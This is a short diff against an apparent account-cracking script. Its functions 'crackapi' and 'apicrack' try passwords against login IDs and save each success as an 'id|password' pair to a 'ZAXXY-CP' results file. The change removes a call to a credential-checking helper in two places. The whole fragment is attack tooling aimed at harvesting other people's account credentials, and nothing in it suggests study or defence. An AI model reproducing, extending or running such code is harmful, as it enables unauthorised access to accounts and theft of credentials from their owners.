@@ -560,7 +560,6 @@ def crackapi(idf,pwx,url):
         print(f'UGEN : {mer}{ua}{puti}')
         open('ZAXXY-CP/'+'ZAXXY-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
         akune.append(idf+'|'+pw)
-        ceker(idf,pw)
         cp+=1
         break	
       else:
@@ -636,7 +635,6 @@ def apicrack(idf,pwx,url):
         print(f'UGEN : {mer}{ua}{puti}')
         open('ZAXXY-CP/'+'ZAXXY-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
         akune.append(idf+'|'+pw)
-        ceker(idf,pw)
         cp+=1
         break	
       else:
